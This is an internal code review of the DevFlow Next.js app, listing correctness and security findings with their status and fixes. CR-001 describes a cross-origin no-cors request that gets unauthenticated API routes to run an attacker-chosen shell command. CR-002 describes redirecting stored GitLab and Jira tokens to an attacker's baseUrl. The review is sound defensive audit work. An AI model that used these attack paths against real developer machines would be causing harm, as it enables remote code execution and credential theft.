# DevFlow code review (consolidated)

- **Date:** 2026-10-31 (original review at commit `966629e`)
- **Re-verified:** 2026-10-31 against branch `refactor/prompt-engine-inconsistency-fix` at `abaa007`. Every item now carries a "Status at `abaa007`" line, its current location, and the task that fixes it. Work is broken into ordered tasks in [`docs/review-tasks/`](review-tasks/README.md), and target conventions are in [`docs/coding-patterns.md`](coding-patterns.md).
- **Scope policy:** only the current working flow is supported. Findings that only affect legacy or deprecated flows are marked obsolete, and their leftover code is scheduled for deletion. Security fixes are scheduled last.
- **Repository:** DevFlow, originally reviewed at `/Users/mihir.shah/ship`. Stack: Next.js 15 App Router, React 19, TypeScript strict, Tailwind v4, TanStack Query, better-sqlite3.
- **Scope:** the whole repository, split into eight review areas: `app/` + `loaders/` (APP), `lib/engine` core and shared `lib/` (ENG), `lib/engine/nodes` (NODE), `lib/db` + `lib/git` + `lib/integrations` (DATA), `components/flows` + `components/chat` + `hooks/` (FLOWUI), template editor/builder/templates (TPL), settings/tasks/shared/ui/constants/types (UI), and scripts/configs/docs/tooling (TOOL).
- **Method:** one mapping agent partitioned the repo, then eight area reviewers each read every file in their area and wrote findings against AGENTS.md. All review work was read-only; the only file written is this one. This document de-duplicates cross-area overlaps, renumbers every item as `CR-NNN` (ordered by severity, then area), and keeps each original finding's content verbatim. References to original IDs inside finding text are annotated with their CR ID, e.g. `TOOL-01 (CR-0xx)`.
- **Independence:** every CR item is scoped so it can be handed to a separate agent or PR. Where fixes interact, the item has a `Related:` line, and "fix CR-X first" marks a hard ordering.

## Baseline checks

At `abaa007`:

| Check | Result |
| --- | --- |
| `npx tsc --noEmit` | **Fails: 11 errors in 5 files**, all in tests and scripts (`tests/plan-diff.test.ts`, `split-manager.test.ts`, `split-smoke-template.test.ts`, `plan-split-units-demo.test.ts`, `scripts/verify-prompt-parity.ts`). Vitest does not type-check, so `npm test` stays green. See CR-273. |
| `npm run lint` | Runs: 0 errors, 147 warnings (cap enforced with `--max-warnings=147`). Phase-0 `any`/`!`/`exhaustive-deps` violations are frozen per-file in `eslint/frozen-phase0-offenders.mjs` (CR-162 fixed in Task 03); new `lib/` files lint at error. Typed `@typescript-eslint/no-floating-promises` warns on `lib/**`. API routes require `export const runtime = "nodejs"` (CR-170). |
| `npm test` | Pass: 23 files, 252 tests (Vitest, added after the review). |
| `npm run build` | Not re-run (the dev server was using `.next`). It still skips lint (`eslint.ignoreDuringBuilds: true`, CR-257), and its type-check covers the same files as `tsc`, so expect it to fail until CR-273 is fixed. |

At review time (`966629e`): `tsc` passed, `build` passed while skipping lint, lint could not run, and there were no tests.

## Status at `abaa007`

| Status | Critical | High | Medium | Low | Total |
| --- | ---: | ---: | ---: | ---: | ---: |
| Open | 1 | 35 | 113 | 89 | 238 |
| Partly fixed | 0 | 2 | 9 | 13 | 24 |
| Fixed | 0 | 2 | 3 | 2 | 7 |
| Obsolete (legacy, no fix) | 0 | 0 | 1 | 3 | 4 |
| **Total** | 1 | 39 | 126 | 107 | 273 |

Severity here is the current severity. A few items were re-rated because the code changed; each one says "was X".

- **Fixed (7):** CR-018, CR-039, CR-087, CR-091, CR-125, CR-204, CR-226.
- **Obsolete (4):** CR-158, CR-211, CR-212, CR-263. These only affect legacy data shapes or flows. Their leftover code is deleted in Tasks 07 and 08.
- **New (5):** CR-269 to CR-273, found while re-verifying (see "Findings: New at `abaa007`"). CR-270 is High: "latest plan" reads can return plan v1 after vN was approved.
- Large refactors landed since the review (engine moved into `runtime/`, `nodes/kinds/`, `nodes/shared/`, `harness/` and `prompts/`; the plan node rewritten around unified turns; legacy plan code deleted; Vitest added). Most findings still reproduce at their new paths.
- Code added after `966629e` (split manager, plan node collaborators, chat panel, plan UI) was only reviewed where it overlapped an existing finding. A dedicated review of that code is still to do.

## Summary

Counts below are from the original review at `966629e`.

268 CR items from 284 original findings. 14 cross-area duplicate groups were merged, combining 30 original findings into 14 items (16 duplicates removed).

CR items by severity and area. A merged item is counted under the area of its primary (highest-severity, first-listed) source.

| Area | Critical | High | Medium | Low | Total |
| --- | ---: | ---: | ---: | ---: | ---: |
| Area 1 — App/API (app/, loaders/) (APP) | 1 | 4 | 12 | 13 | 30 |
| Area 2 — Engine core & shared lib (ENG) | 0 | 8 | 20 | 19 | 47 |
| Area 3 — Engine nodes (NODE) | 0 | 7 | 24 | 11 | 42 |
| Area 4 — DB, git, integrations (DATA) | 0 | 5 | 21 | 16 | 42 |
| Area 5 — Flow runtime UI (FLOWUI) | 0 | 3 | 13 | 11 | 27 |
| Area 6 — Template authoring (TPL) | 0 | 6 | 15 | 6 | 27 |
| Area 7a — Settings, tasks, shared UI, constants, types (UI) | 0 | 4 | 10 | 14 | 28 |
| Area 7b — Tooling & config (TOOL) | 0 | 3 | 10 | 12 | 25 |
| **Total** | **1** | **40** | **125** | **102** | **268** |

CR items by category (merged items use the primary source's category):

| Category | Critical | High | Medium | Low | Total |
| --- | ---: | ---: | ---: | ---: | ---: |
| Correctness | 1 | 38 | 97 | 35 | 171 |
| Boundaries | 0 | 1 | 18 | 17 | 36 |
| Code quality | 0 | 1 | 10 | 50 | 61 |

Merged duplicate groups:

| CR | Severity | Original IDs | Topic |
| --- | --- | --- | --- |
| CR-012 | High | ENG-07, DATA-29 | The DB façade has no transaction API |
| CR-023 | High | DATA-03, ENG-25 | GitLab token embedded in git clone/push URLs leaks into error text |
| CR-039 | High | TOOL-01, NODE-44 | Lint toolchain is not installed (eslint deps missing from the lockfile) |
| CR-041 | High | TOOL-03, DATA-25, NODE-43 | No test runner and no tests anywhere |
| CR-046 | Medium | APP-10, ENG-28 | No typed error classes: the engine throws bare `Error` |
| CR-069 | Medium | ENG-24, DATA-08 | GitLab webhook verification fails open when `GITLAB_WEBHOOK_SECRET` is unset |
| CR-107 | Medium | DATA-16, ENG-45 | Worktree ensure is de-duplicated per `flow:branch` while the directory is per flow |
| CR-108 | Medium | DATA-17, APP-19 | Event ids are not monotonic within a millisecond |
| CR-114 | Medium | DATA-23, APP-12 | Deleting a repo referenced by any flow throws an unhandled FK error (500); no foreign key declares `ON DELETE` behaviour |
| CR-161 | Medium | TOOL-08, FLOWUI-16, UI-27 | The client `lib/` import guard skips `hooks/` |
| CR-163 | Medium | TOOL-10, TPL-23 | Two inline `react-hooks/exhaustive-deps` suppressions in the template editor |
| CR-166 | Medium | TOOL-13, UI-18 | The settings barrel omits `SettingsProvider`/`useSettings` |
| CR-195 | Low | ENG-47, TPL-27 | `lib/engine` imports the JSONata evaluator from `components/template-editor` (inverted server→UI boundary) |
| CR-259 | Low | TOOL-16, UI-29 | Two competing `cn()` implementations are used side by side |

Overlaps considered but kept separate (fixes live in different code and can ship independently; they are cross-linked instead): APP-02 vs DATA-04 (route-side `baseUrl` override vs adapter-side single-instance fallback), APP-03 vs NODE-10/NODE-24/DATA-24 (API-boundary Zod vs node config and DB-payload validation), UI-13 vs FLOWUI-24 vs APP-26 (duplicated client types in different features), ENG-11 vs DATA-19 (engine cancel guard vs Cursor client re-attach), ENG-06 vs NODE-09 (poller event comparison vs pipeline-node head detection), ENG-14 vs DATA-35 (merge-arena singleton vs `lib/git`/integration singletons), ENG-09/ENG-10 vs NODE-01/NODE-02 (engine claim guards vs runner attempt identity), UI-02 vs TPL-18 (settings vs editor fetchers), APP-08 vs CR-069 (webhook route ordering vs verification policy), DATA-02 vs CR-012 (migration atomicity vs engine writes), ENG-37 vs DATA-27 (secrets module shape vs at-rest encryption), TOOL-14 vs CR-039 (build skips lint vs lint not installed).

## Suggested fix order

Superseded by the ordered backlog in [`docs/review-tasks/README.md`](review-tasks/README.md). The order is:

1. **Phase 0, hotfix and quality gates:** CR-270 (latest plan artifact), then green typecheck, lint, tests and build as real gates, stricter lint, the client/server boundary rules, test coverage for mappers and fixtures, DB path and seed safety, and deleting dead and legacy code together with a canonical `schema.sql`.
2. **Phase 1, shared foundations:** typed errors, Zod at the API boundary, `db.transaction`, one `queryFn` per query key, throwing fetchers and mutation conventions. These are the primitives described in [`docs/coding-patterns.md`](coding-patterns.md).
3. **Phase 2, engine and backend bugs:** run lifecycle, atomic node claims and attempt identity, fan-out and merge, multi-branch, graph validation, waits and poller, node config, checklist integrity, integrations, git and worktrees.
4. **Phase 3, frontend bugs and gaps:** cockpit, template editor, settings, tasks.
5. **Phase 4, code quality and structure:** stores and constants, `FlowEngine` split, types, thin routes, DI, shared UI, feature layout and naming.
6. **Phase 5, docs.**
7. **Phase 6, security (last, by owner decision):** CR-001, CR-002, CR-016, CR-023, CR-024, CR-068, CR-069, CR-100, CR-105, CR-117, CR-154, CR-176, CR-196, CR-199, CR-254, CR-264, CR-265.

## Themes

### Silent failure in UI fetchers and mutations

The most common UI defect is a fetcher or mutation that turns HTTP/network errors into a fallback value (`null`, `{}`, `[]`) or ignores the response status, so TanStack Query never enters `isError`, no retry is offered, and users see false empty states ("No repos registered yet", "No tasks match") or false success notices ("Draft saved" after a 5xx). The same pattern appears server-side where integration calls swallow errors as "still running" or report a cancel as successful. A shared throwing `fetchJson`/`postJson` plus a mutation-error convention would close most of these.

Items: CR-027, CR-030, CR-036, CR-037, CR-038, CR-109, CR-110, CR-120, CR-121, CR-129, CR-135, CR-143, CR-150, CR-152, CR-153, CR-232, CR-237.

### Run/attempt identity and node state-machine races

Engine and node code decides ownership of a node purely by `nodes.status === 'running'`. There is no attempt token, start guards are check-then-act, several entry points (`startPlan`, `refinePlan`, `sendChat`, `approvePlan`, `cancelNode`) have no guard at all, and the late-write guard returns normally so callers finalize anyway. Together these let cancelled or superseded runs resurrect nodes, double-start agents, double-publish fan-out rollups and double-post review comments. Introducing an atomic claim helper and a per-attempt id is the common fix.

Items: CR-009, CR-014, CR-015, CR-054, CR-055, CR-056, CR-057, CR-060, CR-066, CR-072, CR-081, CR-082, CR-086, CR-088.

### Multi-branch (complex plan) flows

Many paths were written for one branch per flow and break when a complex plan fans out into several branches: the poller compares against the flow-wide last pipeline event, resolve picks up every MR's comments, the commit-fix and MR/pipeline/review/resolve nodes derive the wrong branch, refines drop `complex`, the merge-arena locks per branch over a shared directory, and worktree ensure de-dups per branch over a per-flow directory. These should be tested together with a multi-branch fixture once the test runner exists.

Items: CR-008, CR-011, CR-017, CR-018, CR-019, CR-020, CR-058, CR-074, CR-083, CR-084, CR-106, CR-107.

### Missing validation at trust boundaries

AGENTS.md §3.4 requires Zod at every boundary, but no API route uses it, built-in nodes never check config against `configSchema`, DB JSON payloads are read with casts, GitLab webhook payloads are `any`, and the template validator accepts graphs (cycles, labeled non-decision edges, unknown `wait_for`) that the runtime silently mishandles. Client-side authoring then produces graphs the server rejects. Each item below is independently fixable, but a shared `parseJson(req, schema)` helper (CR-003) should land first.

Items: CR-003, CR-031, CR-032, CR-042, CR-047, CR-048, CR-062, CR-063, CR-076, CR-077, CR-085, CR-090, CR-097, CR-100, CR-105, CR-112, CR-115, CR-164, CR-171, CR-263.

### Non-atomic persistence and fragile migrations

There are zero `transaction()` calls in the repo. Migrations run unversioned on every boot with no transaction, the connection is cached before they finish, table rebuilds are not resumable, seed scripts bypass migrations, and engine/route multi-writes (flow create/delete, checklist replace, template save, YAML import) hand-roll rollbacks or none at all. Deletes also rely on hand-ordered child deletes because no FK declares `ON DELETE`.

Items: CR-012, CR-013, CR-021, CR-022, CR-050, CR-067, CR-114, CR-158, CR-159, CR-192, CR-210, CR-211, CR-212, CR-221.

### Credential and secret hygiene

The API is unauthenticated and CSRF-able; stored tokens can be pointed at attacker URLs; GitLab tokens live in git URLs, `.git/config` and error text; the script node forwards the whole server env; the SSRF guard replays secret headers across redirects; webhooks fail open; secrets are stored in plaintext and partly shipped to clients; and remote images in agent-authored Markdown are an exfiltration channel. These are the security-critical items and dominate the suggested fix order.

Items: CR-001, CR-002, CR-016, CR-023, CR-024, CR-068, CR-069, CR-117, CR-154, CR-176, CR-186, CR-196, CR-199, CR-254, CR-264, CR-265.

### Boundary and convention enforcement (lint, layering, constants)

AGENTS.md §5 says to prefer failing lint over prose, but lint cannot run at all, the build skips it, backend rules are downgraded to `warn`, the client `lib/` guard skips `hooks/`/`types/`/`constants/`, inline disables are allowed, barrel rules are partial, and `server-only` is neither declared nor enforced. As a result layering has drifted (engine imports UI code, routes and nodes run raw SQL, god classes/modules, module-level singletons outside `processSingleton`) and §2.7 domain constants are bypassed in every area. Install lint first, then the rule items, then the per-area cleanups.

Items: CR-039, CR-051, CR-059, CR-070, CR-071, CR-095, CR-096, CR-116, CR-118, CR-161, CR-162, CR-163, CR-165, CR-166, CR-169, CR-170, CR-175, CR-180, CR-181, CR-195, CR-201, CR-215, CR-217, CR-228, CR-238, CR-243, CR-246, CR-247, CR-257, CR-259.

### Process-local state, background work and timeouts

Long-lived engine state (wait timers, merge locks, reconcile throttles, caches) lives only in memory, is lost on restart or duplicated across `next dev` bundles, and grows unbounded. The poller starts as a side effect of GET traffic, its ticks can overlap, fire-and-forget promises escape unhandled, and outbound HTTP/git/setup calls have no timeouts or cancellation, so a slow dependency can hang pollers and settings requests indefinitely.

Items: CR-006, CR-010, CR-025, CR-045, CR-059, CR-060, CR-061, CR-101, CR-102, CR-103, CR-104, CR-111, CR-189, CR-193, CR-194, CR-223.

## Findings

Each item below can be fixed independently. Severity headings group the items; within a severity, items are ordered by area (APP, ENG, NODE, DATA, FLOWUI, TPL, UI, TOOL) and then by original ID.

## Findings: Critical (1)

### CR-001 [Critical] State-changing API has no auth, CSRF or Origin check, so any website can make DevFlow run shell commands

- **Status at `abaa007`:** **Open**, fix in [Task 57](review-tasks/57-security-local-api-hardening.md)
- **Current location:** (no middleware.ts at repo root); app/api/repos/test-setup/route.ts:38-75; app/api/settings/route.ts:104-178; app/api/repos/route.ts:36-62; app/api/host-instances/[host]/route.ts:14-25; app/api/task-instances/[kind]/route.ts:19-39; package.json:6,8 (`next dev` / `next start` with no `-H 127.0.0.1`)
- **Re-verification note:** Still no session/token, Origin, Sec-Fetch-Site or Content-Type check on any state-changing route, and `/api/repos/test-setup` still passes a caller-supplied `setup_command` straight to `worktreeSetup.probe`. Add a root `middleware.ts` for `/api/:path*` that rejects non-GET requests unless the Origin matches and the body is `application/json`, plus a startup-generated local token (exempt `/api/hooks/*` and `/api/webhooks/*`), and bind dev/start to 127.0.0.1.

- **Severity:** Critical
- **Category:** Correctness
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-01
- **Related:** CR-002 (APP-02); CR-069 (ENG-24, DATA-08)
- **Location:** `app/api/repos/test-setup/route.ts:38-75`, `app/api/settings/route.ts:104-178`, `app/api/repos/route.ts:36-62`, `app/api/host-instances/[host]/route.ts:14-25`, `app/api/task-instances/[kind]/route.ts:19-39`. There is no `middleware.ts` at the repo root.
- **Problem:** No route checks a session, token, `Origin` or `Sec-Fetch-Site`. Every handler reads the body with `await req.json()`, and that call parses the body whatever the `Content-Type` is. So a cross-origin `fetch(..., {method:"POST", mode:"no-cors", body: JSON.stringify(...)})` from any page the developer visits is a "simple" request: the browser sends it without a CORS preflight and the route executes it. On `/api/repos/test-setup` the attacker supplies `setup_command`, and `worktreeSetup.probe` runs it as a shell command (`SetupCommandStep.run` → `runCommand(this.command, wt)`, `lib/git/worktree-setup.ts:324-327`). That is remote code execution from a drive-by web page, given any guessable git checkout path such as `~/ship`. The same request shape can also overwrite `cursor_api_key`, `secrets` and `http_allowlist` (settings PATCH), or register repos and instances. `next dev` and `next start` bind to `0.0.0.0` by default, so other machines on the LAN can reach the API too.
- **Evidence:**
  ```ts
  // app/api/repos/test-setup/route.ts
  export async function POST(req: Request) {
    const body = await req.json();               // no auth / origin / content-type check
    ...
    setup_command: optString(body.setup_command), // executed by worktreeSetup.probe
  ```
- **Suggested fix:** Add a root `middleware.ts` for `/api/:path*` that rejects non-GET requests unless `Origin` matches the app host and `Content-Type` is `application/json`. Also require a local session token, for example one generated at startup and injected into the page. Exempt `/api/hooks/*` and `/api/webhooks/*`, which authenticate with their own signatures. Bind the server to `127.0.0.1` in the `dev`/`start` scripts.
- **Effort:** M

## Findings: High (40)

### CR-002 [High] The instance "test" endpoints send the stored token to a caller-supplied `baseUrl`

- **Status at `abaa007`:** **Open**, fix in [Task 57](review-tasks/57-security-local-api-hardening.md)
- **Current location:** app/api/host-instances/[host]/[id]/route.ts:29-36 (test), 6-17 (PATCH); app/api/task-instances/[kind]/[id]/route.ts:39-58 (test), 6-26 (PATCH); app/api/host-instances/[host]/route.ts:14-25; app/api/task-instances/[kind]/route.ts:19-39; lib/integrations/gitlab/git-host.ts:236-240; lib/engine/tasks/providers/jira.ts:87-98; lib/integrations/gitlab/client.ts:311-322; lib/integrations/jira/service.ts:76-93
- **Re-verification note:** `testInstance` still pairs a caller-supplied `baseUrl` with the stored token (`input.baseUrl ?? existing.base_url`, `input.token || existing.token`) for both GitLab and Jira, so a request that sends only `{baseUrl}` ships the stored PAT or Basic credentials to any host. Reject a `baseUrl` override unless `token` is also supplied, and validate `baseUrl` with Zod (https URL) plus the SSRF guard in the add/update/test routes.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-02
- **Related:** CR-001 (APP-01); CR-024 (DATA-04); CR-068 (ENG-23)
- **Location:** `app/api/host-instances/[host]/[id]/route.ts:29-36`, `app/api/task-instances/[kind]/[id]/route.ts:39-58`, plus the unvalidated `baseUrl` on add/update: `app/api/host-instances/[host]/route.ts:18-24`, `app/api/host-instances/[host]/[id]/route.ts:10-16`, `app/api/task-instances/[kind]/route.ts:26-31`, `app/api/task-instances/[kind]/[id]/route.ts:13-19`
- **Problem:** `POST /api/host-instances/gitlab/:id` accepts `{baseUrl}` and passes it to `testInstance`. The adapter then calls `fetch(`${input.baseUrl ?? existing.base_url}/api/v4/user`, {headers: {"PRIVATE-TOKEN": input.token || existing.token}})` (`lib/integrations/gitlab/git-host.ts:236-239`, `client.ts:311-315`). A request that sets only `baseUrl` therefore sends the stored GitLab token to an attacker's host. The Jira path does the same thing with `email:token` Basic auth. Combined with APP-01 (CR-001), a malicious page can steal every stored credential (instance ids come from the unauthenticated `GET /api/git-hosts` if it can be read; otherwise they must be guessed). There is also no URL or scheme validation, and the SSRF guard in `lib/net/ssrf-guard.ts` is not used.
- **Evidence:**
  ```ts
  const body = await req.json().catch(() => ({}));
  const result = await svc.testInstance(id, { baseUrl: body.baseUrl ?? body.base_url, token: body.token });
  ```
- **Suggested fix:** If a request overrides `baseUrl`, require it to also supply `token`, and never pair a stored token with a new URL. Validate `baseUrl` with Zod (`z.string().url()`, https only) and run it through the SSRF guard. Do the same in the add and update routes.
- **Effort:** S

### CR-003 [High] No Zod validation at any API boundary, so bad bodies cause 500s or get saved

- **Status at `abaa007`:** **Partly fixed** (Tasks 10–11 — `parseJson` / `parseQuery`; flow, settings, repo, host-instance, task-instance, and node-template routes validated; still open: `templates/*`, `tasks/materialize`, `tasks/handlers`, `webhooks/gitlab`, some query routes)
- **Current location:** raw `await req.json()` at app/api/flows/route.ts:14, app/api/flows/[id]/action/route.ts:117, app/api/flows/[id]/chat/route.ts:14, app/api/host-instances/[host]/route.ts:18, app/api/host-instances/[host]/[id]/route.ts:10, app/api/repos/route.ts:37, app/api/repos/[id]/route.ts:26-28, app/api/repos/test-setup/route.ts:39, app/api/settings/route.ts:105,134,175, app/api/task-instances/[kind]/route.ts:25, app/api/task-instances/[kind]/[id]/route.ts:11, app/api/tasks/handlers.ts:28, app/api/webhooks/gitlab/route.ts:27; cast-only bodies at app/api/flows/[id]/action/route.ts:9-34, app/api/node-templates/route.ts:30, app/api/node-templates/[id]/route.ts:15, app/api/templates/[id]/route.ts:40, app/api/templates/[id]/validate/route.ts:27, app/api/tasks/materialize/route.ts:14; lib/integrations/jira/service.ts:36
- **Re-verification note:** Only the new split-unit actions (`parseSplitUnitBody`, action/route.ts:101-113) are Zod-validated; every listed failure still reproduces (`local_path.startsWith` 500, `String(h)` allowlist entries, `String(body.default_model)`, `input.email.trim()` on a missing email, unchecked node-template kind). Add a shared `parseJson(req, schema)` helper that returns 400, one schema per route, and a `z.discriminatedUnion("action", …)` for the action route that replaces the hand-written `ActionBody`.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-03
- **Related:** CR-042 (APP-06); CR-047 (APP-11); CR-048 (APP-13); CR-076 (NODE-10); CR-090 (NODE-24); CR-173 (APP-26); CR-182 (ENG-33); CR-213 (DATA-33)
- **Location:** Unguarded `await req.json()` (invalid JSON throws a 500) at `app/api/flows/route.ts:15`, `app/api/flows/[id]/action/route.ts:76`, `app/api/flows/[id]/chat/route.ts:14`, `app/api/host-instances/[host]/route.ts:18`, `app/api/host-instances/[host]/[id]/route.ts:10`, `app/api/repos/route.ts:37`, `app/api/repos/[id]/route.ts:26`, `app/api/repos/test-setup/route.ts:39`, `app/api/settings/route.ts:105`, `app/api/task-instances/[kind]/route.ts:25`, `app/api/task-instances/[kind]/[id]/route.ts:11`, `app/api/tasks/handlers.ts:28`, `app/api/webhooks/gitlab/route.ts:27`. Cast-only "validation" at `app/api/flows/[id]/action/route.ts:7-35` (where the comment itself says "trusted-but-typed … real Zod validation … is a documented backend follow-up"), `app/api/node-templates/route.ts:30-33`, `app/api/node-templates/[id]/route.ts:15-18`, `app/api/templates/[id]/route.ts:40-47`, `app/api/templates/[id]/validate/route.ts:27-34`, `app/api/tasks/materialize/route.ts:15-26`. Unvalidated query params at `app/api/flows/[id]/events/route.ts:13-14`, `app/api/contracts/route.ts:39-50` and `app/api/flows/[id]/prompt/route.ts:22-27`.
- **Problem:** AGENTS.md §3.4 requires Zod at every boundary. Concrete failures today:
  - `PATCH /api/repos/:id {local_path: 1}` throws `localPath.startsWith is not a function`, which surfaces as a 500 (`repos/[id]/route.ts:28`).
  - `PATCH /api/settings {http_allowlist:[{}]}` stores the hostname `"[object object]"` (`settings/route.ts:175`).
  - `PATCH /api/settings {default_model: {}}` stores `"[object Object]"` (`settings/route.ts:134`).
  - A task-instance POST without `email` returns `Cannot read properties of undefined (reading 'trim')` to the client (`lib/integrations/jira/service.ts:36`).
  - `POST /api/node-templates {kind:"anything"}` reaches the store unchecked.
  - `materialize` checks only 3 fields, then passes the whole `LiveTask` to `upsertLive`.
- **Evidence:**
  ```ts
  const body = (await req.json()) as ActionBody;   // action/route.ts:76
  let localPath = body.local_path !== undefined ? body.local_path : existing.local_path;
  if (localPath && localPath.startsWith("~")) {    // repos/[id]/route.ts:27-28
  ```
- **Suggested fix:** Add a shared helper, for example `parseJson(req, schema)` in `lib/http/`, that returns a 400 on invalid JSON or a schema miss. Define one Zod schema per route, next to the route or in `lib/schemas/`. The action route should use a `z.discriminatedUnion("action", …)`. Infer the body types with `z.infer` instead of the hand-written `ActionBody` and inline casts.
- **Effort:** L

### CR-004 [High] The prompt preview shows a different local-mode build prompt from the one the build node sends

- **Status at `abaa007`:** **Fixed** ([Task 28](review-tasks/28-prompt-preview-parity.md))
- **Current location:** lib/engine/nodes/kinds/build/build-node.ts (`buildPromptAssembly` / `previewPrompt` / `run`)

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-04
- **Related:** CR-049 (APP-14); CR-126 (FLOWUI-11)
- **Location:** `app/api/flows/[id]/prompt/route.ts:121-133` (compare `lib/engine/nodes/build/build-node.ts:188-190`)
- **Problem:** The route says it returns "exactly what the run will send" (lines 100-101), but it builds its own copy of the build instructions. In local mode the preview tells the agent to "First create and check out a new git branch … then push". The real build node says the worktree is "already checked out on branch … do not switch branches, and do not touch any checkout outside this directory". The user reviews or edits one prompt and the agent receives a different one. Seeding the editable body from the preview can also send contradictory branch instructions to the agent.
- **Evidence:**
  ```ts
  // route.ts:127
  ? `Implement the following approved plan ... First create and check out a new git branch named "${branch}" ...`
  // build-node.ts:189
  ? `Implement the following approved plan ... Your working directory is a git worktree already checked out on branch "${branch}" ...`
  ```
- **Suggested fix:** Have the node produce the preview, for example `BuildNode.previewPrompt(ctx, opts)`, sharing one helper with its run path. The route then calls `nodeRegistry.get(key).previewPrompt(...)`. APP-14 (CR-049) makes the same change for every node.
- **Effort:** M

### CR-005 [High] The template editor SSR seeds the shared `queryKeys.repos` cache with a different data shape

- **Status at `abaa007`:** **Fixed** ([Task 13](review-tasks/13-frontend-query-ownership.md))
- **Current location:** app/templates/[id]/page.tsx:52-55; loaders/templates.ts:35-40; components/builder/hooks/use-editor-queries.ts:74; components/settings/context.tsx:69; components/template-editor/WebhookPayloadDialog.tsx:148
- **Re-verification note:** The editor SSR still seeds `queryKeys.repos` with the slim `EditorRepoChoice[]` (`{id,name,local_path}`), and Settings and WebhookPayloadDialog read the same key expecting full `Repo[]`. Give the editor slice its own key (for example `queryKeys.repoChoices`) in both the page and `use-editor-queries.ts`, or seed full `Repo[]` and narrow it with `select`.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-05
- **Related:** CR-135 (TPL-10); CR-155 (UI-13)
- **Location:** `app/templates/[id]/page.tsx:52-55` (with `loaders/templates.ts:35-40`)
- **Problem:** The page prefetches `queryKeys.repos` with `EditorRepoChoice[]` (`{id,name,local_path}` only) and hydrates it into the app-wide QueryClient from `app/providers.tsx`. Settings uses the same key for full `Repo[]` (`components/settings/context.tsx:69`, `fetchRepos`), and so does `WebhookPayloadDialog`. With `staleTime: 30_000` and the client surviving navigation, the following happens if the user opens a template and then goes to Settings → Repositories within 30 s: the repo list renders from cached objects that lack `cloud_url`, `default_branch`, `install_command` and the other fields. Hydration also overwrites an older full-shape entry, so a fresh settings cache gets downgraded too.
- **Evidence:**
  ```ts
  queryClient.prefetchQuery({
    queryKey: queryKeys.repos,
    queryFn: () => boot.repos,   // EditorRepoChoice[] — not Repo[]
  }),
  ```
- **Suggested fix:** Give the slim editor slice its own key, for example `queryKeys.repoChoices`, and use it in both the page and `use-editor-queries.ts`. The alternative is to seed the full `Repo[]` and have the editor use a `select` to narrow it.
- **Effort:** S

### CR-006 [High] Timer and comment-debounce waits are memory-only, so a restart strands `waiting` nodes forever

- **Status at `abaa007`:** **Fixed** ([Task 25](review-tasks/25-wait-timers-and-poller.md) — startup re-arm; durable `nodes.wait_until` deferred)
- **Current location:** lib/engine/flow-engine.ts:1290-1295 (armNodeWait), 1325-1333 (bounceCommentWaits), 1895-1925 (waitTimers / processWaitTimers); lib/engine/runtime/flow-poller.ts:26-41 (start: no re-arm pass)
- **Re-verification note:** Timer and comment-debounce deadlines still live only in the in-memory `waitTimers` Map, and nothing re-arms `waiting` nodes after a restart. The comment at 1895-1900 claims a restart re-arms "on the next join evaluation", but no code does that. Persist `wait_until` on the node row (needs schema approval and a row-mapper update), or at minimum add a startup pass in `FlowPoller.start()` that re-arms every `waiting` timer/comments node from `updated_at` plus its configured minutes.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-01
- **Related:** CR-045 (APP-09); CR-070 (ENG-26)
- **Location:** `lib/engine/flow.ts:1087-1092`, `lib/engine/flow.ts:1674-1681`, `lib/engine/flow.ts:1459-1460`, `lib/engine/reconcile.ts:76-96`
- **Problem:** `armNodeWait` sets the node to `waiting` in the DB, but the deadline lives only in `this.waitTimers` (a `Map`). After a server restart the map is empty, and nothing re-arms it: no startup sweep exists, and reconcile only handles `running` nodes. `wait_for: timer` and debounced `wait_for: comments` nodes therefore never fire. `retryNode` also refuses `waiting` nodes, so the only way out is cancel-then-retry. The comment at 1677-1679 admits the node "resumes only via a new delivery", and timers have no delivery. In the SDLC loop this means the debounced resolve never runs after a deploy or restart.
- **Evidence:**
  ```ts
  if (wait === "timer" || wait === "comments") {
    const mins = minutes ?? (wait === "comments" ? 10 : 1);
    this.waitTimers.set(`${flowId}\n${nodeKey}`, Date.now() + mins * 60_000);
  }
  ...
  private waitTimers = new Map<string, number>();
  ```
- **Suggested fix:** Persist the deadline on the node row (for example `nodes.wait_until` in ISO UTC; this needs schema approval and a row-mapper update). `processWaitTimers` should then query `status='waiting' AND wait_until<=now`. Until that exists, add a startup pass in `FlowPoller.start()` that re-arms every `waiting` timer/comments node from its `updated_at` plus the configured minutes.
- **Effort:** M

### CR-007 [High] Loop re-entry never resets `skipped` nodes, so the second iteration deadlocks on a previously skipped branch

- **Status at `abaa007`:** **Fixed** ([Task 23](review-tasks/23-graph-semantics-and-validation.md))
- **Current location:** lib/engine/flow-engine.ts:1002-1022 (resetLoopEntry), 941-943 (statusTerminalSuccess), 1171 (startNodeStage pending guard)
- **Re-verification note:** `resetLoopEntry` still resets and walks only `done`/`approved` nodes, so a branch that was `skipped` in iteration 1 stays `skipped`, and `startNodeStage` silently returns on the second pass. Treat `skipped` as resettable in the loop walk and add a two-iteration decision-in-loop engine test.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-02
- **Location:** `lib/engine/flow.ts:828-847`, `lib/engine/flow.ts:995-997`, `lib/engine/flow.ts:941-953`
- **Problem:** `resetLoopEntry` resets only success-terminal nodes (`done`/`approved`) and walks only through them. Take a loop `review → decision → {fix | ship}` where iteration 1 picks `fix`. `ship` resolves to `skipped`, and the loop edge then re-enters `review`. In iteration 2 the decision picks `ship`, and `advanceFrom` calls `startNodeStage(ship)`, which returns immediately because the status is `skipped`, not `pending`. The flow halts with no error. The skipped node's stale state also feeds `incomingResolution` for joins downstream of it.
- **Evidence:**
  ```ts
  const st = this.nodeStatus(flowId, k);
  if (this.statusTerminalSuccess(st)) {
    this.setNodeStatus(flowId, k, "pending");
    ...
  // startNodeStage
  if (opts.resumeWaiting ? status !== "waiting" : status !== "pending") return;
  ```
